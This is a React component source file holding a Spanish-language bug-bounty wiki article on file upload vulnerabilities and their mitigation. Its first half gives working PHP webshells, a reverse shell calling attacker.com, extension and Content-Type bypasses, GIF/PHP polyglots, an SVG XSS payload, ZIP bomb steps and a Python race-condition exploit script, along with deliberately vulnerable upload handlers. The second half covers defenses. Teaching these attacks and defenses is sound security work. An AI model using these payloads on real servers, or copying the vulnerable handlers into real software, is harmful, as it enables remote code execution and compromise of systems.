/**
 * FILE UPLOAD VULNERABILITIES
 * Subir archivos maliciosos para RCE
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Upload, Shield, FileCode, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function FileUploadContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="File Upload - Tu Archivo, Tu Código, Tu Server">
        <Paragraph>
          <Strong>Unrestricted File Upload</Strong> permite subir archivos maliciosos (webshells PHP, ASP, JSP) 
          que se ejecutan en el servidor, resultando en <Strong>Remote Code Execution</Strong> total.
        </Paragraph>

        <AlertDanger title="Vectores de Ataque">
          <ul className="mt-2 space-y-1">
            <ListItem>💥 RCE via webshells (PHP, ASP, JSP)</ListItem>
            <ListItem>🎭 Bypass de validación (magic bytes, double extension)</ListItem>
            <ListItem>📝 Overwrite de archivos críticos (.htaccess)</ListItem>
            <ListItem>🔍 XXE via SVG/XML upload</ListItem>
            <ListItem>💣 DoS via archivos ZIP bomb</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="webshell-basico" title="1. Webshell Básico - PHP">
        <CodeBlock
          language="php"
          title="shell.php - Webshell minimalista"
          code={`<?php
// Webshell simple - 1 línea
system($_GET['cmd']);
?>

<!-- Uso:
http://victim.com/uploads/shell.php?cmd=id
http://victim.com/uploads/shell.php?cmd=cat /etc/passwd
-->`}
        />

        <CodeBlock
          language="php"
          title="shell.php - Webshell con UI"
          code={`<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Shell</title>
</head>
<body>
    <form method="POST">
        <input type="text" name="cmd" autofocus>
        <input type="submit" value="Execute">
    </form>
</body>
</html>`}
        />

        <TerminalOutput title="Uso del webshell">
          {`# 1. Subir shell.php via upload vulnerable
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# 2. Acceder al webshell
http://victim.com/uploads/shell.php?cmd=whoami
→ Output: www-data

# 3. Reverse shell
http://victim.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`}
        </TerminalOutput>
      </Section>

      <Section id="codigo-vulnerable" title="2. Código Vulnerable Común">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - Sin validación"
          code={`<?php
if(isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];
    $destination = 'uploads/' . $filename;
    
    // ❌ VULNERABLE - No validar tipo ni contenido
    move_uploaded_file($_FILES['file']['tmp_name'], $destination);
    
    echo "File uploaded: $destination";
}
?>

<!-- Cualquier archivo se acepta:
shell.php, backdoor.jsp, webshell.aspx, etc.
-->`}
        />

        <CodeBlock
          language="python"
          title="❌ VULNERABLE - Validación solo por extensión"
          code={`from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename
    
    # ❌ VULNERABLE - Solo verificar extensión en filename
    if filename.endswith(('.png', '.jpg', '.jpeg')):
        file.save(f'uploads/{filename}')
        return 'File uploaded'
    else:
        return 'Invalid file type'

# Bypass: Subir shell.php.jpg (double extension)
# O shell.jpg con contenido PHP (si servidor mal configurado)`}
        />
      </Section>

      <Section id="bypass-extension" title="3. Bypass de Validación de Extensión">
        <Subsection title="Técnica 1: Double Extension">
          <CodeBlock
            language="text"
            title="Múltiples extensiones"
            code={`shell.php.jpg
shell.php.png
shell.jpg.php
shell.php%00.jpg     (null byte - PHP < 5.3)
shell.php%20.jpg     (espacio)
shell.php..jpg       (doble punto)`}
          />
        </Subsection>

        <Subsection title="Técnica 2: Case Sensitivity">
          <CodeBlock
            language="text"
            title="Variaciones de mayúsculas"
            code={`shell.PHP
shell.PhP
shell.pHp
shell.Php`}
          />
        </Subsection>

        <Subsection title="Técnica 3: Extensiones Alternativas">
          <CodeBlock
            language="text"
            title="Extensiones ejecutables alternativas"
            code={`# PHP
.php, .php3, .php4, .php5, .php7, .phtml, .phar

# ASP
.asp, .aspx, .cer, .asa

# JSP
.jsp, .jspx

# Perl
.pl, .pm, .cgi

# Python
.py, .pyc, .pyo`}
          />
        </Subsection>

        <Subsection title="Técnica 4: .htaccess Upload">
          <CodeBlock
            language="apache"
            title="Subir .htaccess para ejecutar cualquier extensión"
            code={`# Contenido de .htaccess malicioso
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png

# Ahora .jpg y .png se ejecutan como PHP
# 1. Subir .htaccess
# 2. Subir shell.jpg con código PHP
# 3. Acceder a shell.jpg → PHP ejecutado ✓`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-content-type" title="4. Bypass de Content-Type Validation">
        <CodeBlock
          language="http"
          title="Manipular Content-Type en request"
          code={`POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← Fake Content-Type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Servidor verifica Content-Type header → image/jpeg ✓
# Pero contenido es PHP → Ejecutado si extensión es .php`}
        />
      </Section>

      <Section id="magic-bytes" title="5. Magic Bytes - Bypass de Validación de Contenido">
        <Paragraph>
          Archivos tienen <Strong>magic bytes</Strong> (firma) en los primeros bytes. 
          Agregar magic bytes válidos + código malicioso.
        </Paragraph>

        <CodeBlock
          language="text"
          title="Magic bytes comunes"
          code={`PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF E0
GIF:  47 49 46 38 39 61
PDF:  25 50 44 46
ZIP:  50 4B 03 04`}
        />

        <CodeBlock
          language="bash"
          title="Crear imagen con webshell embebido"
          code={`# Método 1: Agregar PHP después de imagen válida
cat image.png shell.php > malicious.png

# Método 2: Inyectar en metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Método 3: Magic bytes + PHP
echo -e "\\xFF\\xD8\\xFF\\xE0\\n<?php system(\\$_GET['cmd']); ?>" > shell.jpg

# Si servidor verifica magic bytes pero ejecuta como PHP:
# 1. Upload shell.jpg (pasa validación)
# 2. Acceder vía path traversal o rename
# 3. Si se ejecuta como PHP → RCE ✓`}
        />
      </Section>

      <Section id="polyglot-files" title="6. Polyglot Files - Válido como Múltiples Formatos">
        <CodeBlock
          language="php"
          title="GIF + PHP Polyglot"
          code={`GIF89a<?php system($_GET['cmd']); ?>

# Este archivo es válido como:
# - GIF (empieza con GIF89a magic bytes)
# - PHP (contiene código PHP)

# Upload como image.gif
# Ejecutar: http://victim.com/uploads/image.gif?cmd=id`}
        />

        <CodeBlock
          language="xml"
          title="SVG + XSS/XXE"
          code={`<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>

<!-- Si se sirve con Content-Type: image/svg+xml
Y se renderiza en navegador → XSS ejecutado
-->`}
        />
      </Section>

      <Section id="zip-bomb" title="7. ZIP Bomb - Denial of Service">
        <CodeBlock
          language="bash"
          title="Crear ZIP bomb"
          code={`# Crear archivo de 1GB de zeros
dd if=/dev/zero bs=1M count=1024 > 1gb.txt

# Comprimir (ratio ~1000:1)
zip -9 bomb.zip 1gb.txt

# bomb.zip: ~1MB
# Al descomprimir: 1GB

# Repetir 10 veces:
# zip bomb2.zip bomb.zip bomb.zip ...
# Tamaño final: ~1KB
# Al descomprimir recursivamente: 10GB+

# Subir bomb.zip
# Si servidor auto-extrae → Crash por falta de espacio`}
        />
      </Section>

      <Section id="race-condition" title="8. Race Condition - Upload → Rename">
        <Paragraph>
          Algunos servidores suben con nombre temporal, validan, y luego renombran. 
          Explotar ventana de tiempo entre upload y rename.
        </Paragraph>

        <CodeBlock
          language="python"
          title="Script - Race condition exploit"
          code={`import requests
import threading

TARGET = 'http://victim.com/upload'
SHELL_URL = 'http://victim.com/uploads/temp_12345.php'

def upload_shell():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    while True:
        requests.post(TARGET, files=files)

def access_shell():
    while True:
        try:
            r = requests.get(f'{SHELL_URL}?cmd=whoami', timeout=1)
            if 'www-data' in r.text:
                print('[+] SHELL EXECUTED!')
                print(r.text)
                break
        except:
            pass

# Iniciar threads
threading.Thread(target=upload_shell).start()
threading.Thread(target=access_shell).start()

# Estrategia:
# 1. Upload shell.php continuamente
# 2. Intentar acceder a temp file antes de que sea eliminado
# 3. Si se ejecuta → RCE ✓`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ File Upload Seguro">
          Implementar TODAS estas capas de defensa.
        </AlertDanger>

        <Subsection title="1. Whitelist de Extensiones Permitidas">
          <CodeBlock
            language="php"
            title="✅ SEGURO - Validar extensión"
            code={`<?php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];

$filename = $_FILES['file']['name'];
$file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

// ✅ Verificar contra whitelist
if (!in_array($file_extension, $allowed_extensions)) {
    die('Invalid file extension');
}

// ✅ Generar nombre aleatorio (no usar filename original)
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;

// ✅ Guardar fuera de webroot si posible
$destination = '/var/uploads/' . $new_filename;

move_uploaded_file($_FILES['file']['tmp_name'], $destination);
?>`}
          />
        </Subsection>

        <Subsection title="2. Validar Magic Bytes (File Signature)">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Verificar magic bytes"
            code={`import magic

ALLOWED_MIME_TYPES = {
    'image/jpeg': [b'\\xFF\\xD8\\xFF'],
    'image/png': [b'\\x89PNG\\r\\n\\x1a\\n'],
    'image/gif': [b'GIF87a', b'GIF89a'],
    'application/pdf': [b'%PDF']
}

def validate_file(file_path):
    # ✅ Leer primeros bytes
    with open(file_path, 'rb') as f:
        header = f.read(16)
    
    # ✅ Verificar MIME type con libmagic
    mime = magic.from_file(file_path, mime=True)
    
    if mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f'Invalid MIME type: {mime}')
    
    # ✅ Verificar magic bytes
    valid = False
    for magic_bytes in ALLOWED_MIME_TYPES[mime]:
        if header.startswith(magic_bytes):
            valid = True
            break
    
    if not valid:
        raise ValueError('Invalid file signature')
    
    return True

# Uso:
file.save('/tmp/uploaded_file')
validate_file('/tmp/uploaded_file')  # Valida antes de mover a destino`}
          />
        </Subsection>

        <Subsection title="3. Re-encode/Re-save Imágenes">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Destruir metadata y payloads"
            code={`from PIL import Image
import os

def sanitize_image(input_path, output_path):
    try:
        # ✅ Abrir con PIL (valida que sea imagen real)
        img = Image.open(input_path)
        
        # ✅ Re-save (destruye metadata maliciosa)
        img.save(output_path)
        
        # ✅ Eliminar original
        os.remove(input_path)
        
        return True
    except Exception as e:
        print(f'Invalid image: {e}')
        return False

# Uso:
file.save('/tmp/uploaded.jpg')
if sanitize_image('/tmp/uploaded.jpg', '/var/uploads/safe.jpg'):
    print('Image sanitized and saved')

# Payloads en EXIF, comentarios → Eliminados ✓`}
          />
        </Subsection>

        <Subsection title="4. Guardar Fuera de Webroot">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Storage fuera de documentroot"
            code={`const path = require('path');
const fs = require('fs');

// ✅ Directorio FUERA de public/
const UPLOAD_DIR = '/var/app_uploads';  // No accesible vía HTTP

app.post('/upload', upload.single('file'), (req, res) => {
  const file = req.file;
  
  // Validaciones...
  
  // ✅ Guardar fuera de webroot
  const safePath = path.join(UPLOAD_DIR, safe_filename);
  fs.renameSync(file.path, safePath);
  
  // ✅ Servir vía endpoint controlado
  res.json({ 
    success: true, 
    download_url: \`/download/\${file_id}\`  // No path directo
  });
});

// ✅ Endpoint de descarga con validación
app.get('/download/:id', (req, res) => {
  const fileId = req.params.id;
  
  // Validar ownership, permisos, etc.
  const filePath = getFilePathById(fileId);
  
  // ✅ Forzar download (no ejecutar)
  res.download(filePath);
});`}
          />
        </Subsection>

        <Subsection title="5. Content-Disposition: attachment">
          <CodeBlock
            language="php"
            title="✅ Forzar download en lugar de ejecución"
            code={`<?php
$file_path = '/var/uploads/user_file.jpg';

// ✅ Headers para forzar download
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
header('X-Content-Type-Options: nosniff');  // Prevenir MIME sniffing

readfile($file_path);

// Aunque sea shell.php, browser descarga en lugar de ejecutar ✓
?>`}
          />
        </Subsection>

        <Subsection title="6. Disable Script Execution en Upload Directory">
          <CodeBlock
            language="apache"
            title="✅ .htaccess - Bloquear ejecución"
            code={`# En /var/www/html/uploads/.htaccess

# ✅ Deshabilitar ejecución de PHP
php_flag engine off

# ✅ Denegar acceso a .php, .phtml, etc.
<FilesMatch "\\.ph(p[3457]?|t|tml)$">
    Require all denied
</FilesMatch>

# ✅ Solo servir imágenes
<FilesMatch "\\.(jpg|jpeg|png|gif|pdf)$">
    Require all granted
</FilesMatch>

# Ahora shell.php en /uploads/ → 403 Forbidden ✓`}
          />

          <CodeBlock
            language="nginx"
            title="✅ NGINX - Bloquear ejecución"
            code={`# En nginx.conf
location /uploads/ {
    # ✅ Solo servir archivos estáticos
    location ~ \\.php$ {
        deny all;
    }
    
    # ✅ Headers de seguridad
    add_header X-Content-Type-Options "nosniff";
    add_header Content-Disposition "attachment";
}`}
          />
        </Subsection>

        <Subsection title="7. Antivirus Scanning">
          <CodeBlock
            language="python"
            title="✅ Escanear con ClamAV"
            code={`import pyclamd

def scan_file(file_path):
    try:
        # ✅ Conectar a ClamAV daemon
        cd = pyclamd.ClamdUnixSocket()
        
        # ✅ Escanear archivo
        scan_result = cd.scan_file(file_path)
        
        if scan_result:
            # Malware detectado
            print(f'Malware found: {scan_result}')
            os.remove(file_path)
            return False
        
        return True
    except Exception as e:
        print(f'Scan error: {e}')
        return False

# Uso:
file.save('/tmp/upload')
if scan_file('/tmp/upload'):
    # Safe to move to final destination
    shutil.move('/tmp/upload', final_path)`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: CORS Misconfiguration</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/cors-misconfiguration`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar CORS mal configurado</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
